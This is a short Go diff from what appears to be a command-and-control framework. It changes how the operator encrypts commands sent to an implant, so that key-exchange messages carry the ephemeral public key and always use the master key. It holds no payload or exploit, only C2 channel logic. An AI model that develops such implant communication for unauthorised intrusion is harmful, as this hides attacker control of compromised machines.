@@ -96,23 +96,21 @@ func (op *Operator) SendCommand(module string, args map[string]interface{}) (int
 		}
 	}
 
-	// Use session key if forward secrecy is established for this client
+	// Add pubkey to keyexchange commands
+	if module == "keyexchange" && op.ephPub != nil {
+		msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())
+	}
+
+	// keyexchange MUST use master key (implant hasn't derived session key yet)
+	// All other commands use session key if forward secrecy is established
 	var encoded string
 	var err error
-	if op.attachedClient != "" {
+	if module != "keyexchange" && op.attachedClient != "" {
 		if sk, ok := op.sessionKeys[op.attachedClient]; ok {
-			// Add pubkey to keyexchange commands
-			if module == "keyexchange" && op.ephPub != nil {
-				msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())
-			}
 			encoded, err = protocol.EncodeMessageRaw(msg.ToCommandMap(), sk)
 		}
 	}
 	if encoded == "" {
-		// Add pubkey to keyexchange commands (fallback path)
-		if module == "keyexchange" && op.ephPub != nil {
-			msg.PubKey = hex.EncodeToString(op.ephPub.Bytes())
-		}
 		encoded, err = protocol.EncodeMessage(msg.ToCommandMap(), op.key)
 	}
 	if err != nil {
